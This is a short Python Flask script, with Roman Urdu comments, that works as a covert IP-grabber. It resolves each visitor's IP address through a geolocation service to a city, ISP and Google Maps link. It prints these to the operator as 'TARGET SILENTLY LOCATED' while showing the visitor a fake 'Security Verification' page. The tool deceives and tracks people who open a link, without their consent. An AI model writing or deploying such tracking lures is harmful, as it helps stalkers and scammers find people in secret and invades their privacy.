from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    # Zyada behtar tareeqa IP nikalne ka
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    try:
        # Aik zyada reliable service (ip-api.com)
        response = requests.get(f'http://ip-api.com/json/{ip}').json()
        lat = response.get('lat')
        lon = response.get('lon')
        city = response.get('city', 'Unknown')
        isp = response.get('isp', 'Unknown')
        
        # Asli Google Map link jo exact area dikhaye
        if lat and lon:
            map_link = f"https://www.google.com/maps?q={lat},{lon}"
        else:
            map_link = "Coordinates not found"
            
    except Exception as e:
        city = f"Error: {str(e)}"
        map_link = "Service Error"

    print(f"\n--- [!!!] TARGET SILENTLY LOCATED [!!!] ---")
    print(f"IP: {ip} | City: {city} | ISP: {isp}")
    print(f"Exact Map: {map_link}\n")
    
    return "<h2>Security Verification...</h2><p>Checking connection stability, please wait.</p>"
